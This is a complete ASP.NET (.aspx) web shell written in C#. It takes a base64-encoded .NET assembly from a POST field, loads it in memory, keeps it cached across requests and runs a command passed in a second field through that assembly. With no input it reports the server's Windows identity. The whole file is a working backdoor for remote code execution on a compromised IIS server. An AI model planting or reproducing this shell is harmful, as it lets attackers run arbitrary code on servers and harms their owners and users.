<%@ Page Language="C#" Debug="true" ValidateRequest="false" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
    static Assembly _asm;
    static System.Reflection.MethodInfo _run;

    protected void Page_Load(object sender, EventArgs e) {
        Response.ContentType = "text/plain";
        string data = Request.Form["d"];
        string cmd = Request.Form["c"] ?? "whoami";
        if (string.IsNullOrEmpty(data) && _asm == null) {
            Response.Write("POST d=base64&c=cmd\n");
            Response.Write("id: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "\n");
            return;
        }
        try {
            if (_asm == null && !string.IsNullOrEmpty(data)) {
                byte[] raw = System.Convert.FromBase64String(data);
                _asm = Assembly.Load(raw);
                _run = _asm.GetType("X").GetMethod("Run", BindingFlags.Public | BindingFlags.Static);
            }
            string result = (string)_run.Invoke(null, new object[] { cmd });
            Response.Write(result);
        } catch (System.Exception ex) {
            Response.Write("err: " + ex.Message + "\n");
            if (ex.InnerException != null) Response.Write("inner: " + ex.InnerException.Message + "\n");
        }
    }
</script>
